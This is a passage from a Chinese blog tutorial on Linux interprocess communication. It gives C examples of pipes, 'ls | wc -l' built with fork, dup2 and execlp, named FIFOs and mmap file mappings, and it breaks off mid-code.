class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">char</span> *str = <span class="string">"hello pipe\n"</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">    sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">write(fd[<span class="number">1</span>],str,<span class="built_in">strlen</span>(str));</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line">ret = read(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="父子进程实现ls-wc-l"><a href="#父子进程实现ls-wc-l" class="headerlink" title="父子进程实现ls | wc -l"></a>父子进程实现ls | wc -l</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid==<span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"fork error"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">dup2(fd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">dup2(fd[<span class="number">0</span>],STDIN_FILENO);</span><br><span class="line">execlp(<span class="string">"wc"</span>,<span class="string">"wc"</span>,<span class="string">"-l"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="兄弟进程实现ls-wc-l"><a href="#兄弟进程实现ls-wc-l" class="headerlink" title="兄弟进程实现ls | wc -l"></a>兄弟进程实现ls | wc -l</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> ret,i;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">ret = pipe(fd);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"pipe error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">2</span>)&#123;</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">close(fd[<span class="number">0</span>]);</span><br><span class="line">dup2(fd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">1</span>)&#123;</span><br><span class="line">close(fd[<span class="number">1</span>]);</span><br><span class="line">dup2(fd[<span class="number">0</span>],STDIN_FILENO);</span><br><span class="line">execlp(<span class="string">"wc"</span>,<span class="string">"wc"</span>,<span class="string">"-l"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="管道的优劣"><a href="#管道的优劣" class="headerlink" title="管道的优劣"></a>管道的优劣</h5><p>优点：简单，相比信号，套接字实现进程间通信，简单的多</p><p>缺点：只能单向通信，双向通信需建立两个管道，只能用于父子，兄弟等有血缘关系之间的通信</p><h4 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h4><p>也被称为有名管道</p><h5 id="创建fifo"><a href="#创建fifo" class="headerlink" title="创建fifo"></a>创建fifo</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret = mkfifo(<span class="string">"mytestfifo"</span>,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"mkfifo error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="fifo实现非血缘关系之间的进程通信"><a href="#fifo实现非血缘关系之间的进程通信" class="headerlink" title="fifo实现非血缘关系之间的进程通信"></a>fifo实现非血缘关系之间的进程通信</h5><p>第一个文件是写入fifo文件的代码<code>fifo_w.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,i;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter like this: ./a.out fifoname\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fd = open(argv[<span class="number">1</span>],O_WRONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"hello elssm %d\n"</span>,i++);</span><br><span class="line">write(fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个文件是写入fifo文件的代码<code>fifo_r.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,len;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter like this: ./a.out fifoname\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fd = open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,len);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="存储映射"><a href="#存储映射" class="headerlink" title="存储映射"></a>存储映射</h4><h5 id="mmap函数"><a href="#mmap函数" class="headerlink" title="mmap函数"></a>mmap函数</h5><p>创建共享内存映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr,<span class="keyword">size_t</span> length,<span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd,<span class="keyword">off_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">返回：成功 返回创建的映射区首地址</span><br><span class="line">失败：MAP_FAILED宏</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">  addr:建立映射区的首地址，由Linux内核指定，使用时，直接传递<span class="literal">NULL</span></span><br><span class="line">  length:欲创建映射区的大小</span><br><span class="line">  prot:映射区权限  PROT_READ,PROT_WRITE,PROT_READ|PROT_WRITE</span><br><span class="line">  flags:标志位参数(常用于设定更新物理区域，设置共享，创建匿名映射区)</span><br><span class="line">    MAP_SHARED：会将映射区所做的操作反映到物理设备(磁盘)上</span><br><span class="line">    MAP_PRIVATE：映射区所做的修改不会反映到物理设备</span><br><span class="line">  fd:用于创建共享内存映射区的那个文件的文件描述符</span><br><span class="line">  offset:偏移位置，需是<span class="number">4</span>k的整数倍</span><br></pre></td></tr></table></figure><h5 id="mmap函数建立文件映射区"><a href="#mmap函数建立文件映射区" class="headerlink" title="mmap函数建立文件映射区"></a>mmap函数建立文件映射区</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"testmap"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open err"</span>);</span><br><span class="line">lseek(fd,<span class="number">20</span>,SEEK_END);</span><br><span class="line">write(fd,<span class="string">"\0"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len = lseek(fd,<span class="number">0</span>,SEEK_END);</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="literal">NULL</span>,len,PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)&#123;</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用p对文件进行读写操作</span></span><br><span class="line"><span class="built_in">strcpy</span>(p,<span class="string">"hello mmap"</span>); <span class="comment">//写操作</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"------%s\n"</span>,p); <span class="comment">//读操作</span></span><br><span class="line"><span class="keyword">int</span> ret = munmap(p,len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"munmap error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="mmap注意事项"><a href="#mmap注意事项" class="headerlink" title="mmap注意事项"></a>mmap注意事项</h5><ul><li>创建映射区的过程中，隐含着一次对映射文件的读操作</li><li>当<code>MAP_SHARED</code>时，要求：映射区的权限应&lt;=文件打开的权限(出于对映射区的保护)，而<code>MAP_PRIVATE</code>则无所谓，因为mmap中的权限是对内存的限制</li><li>映射区的释放与文件关闭无关，只要映射建立成功，文件可以立即关闭</li><li>特别注意，当映射文件大小为0时，不能创建映射区，所以，用于映射的文件必须要有实际大小</li><li>munmap传入的地址一定是mmap的返回地址，坚决杜绝指针++操作</li><li>文件偏移量必须为4K的整数倍</li><li>mmap创建映射区出错概率非常高，一定要检查返回值，确保映射区建立成功在进行后续操作</li></ul><h5 id="父子进程间mmap通信"><a href="#父子进程间mmap通信" class="headerlink" title="父子进程间mmap通信"></a>父子进程间mmap通信</h5><p>代码练习，父进程创建映射区，然后fork子进程，子进程修改映射区内容，之后父进程读区映射区内容，查看是否共享</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 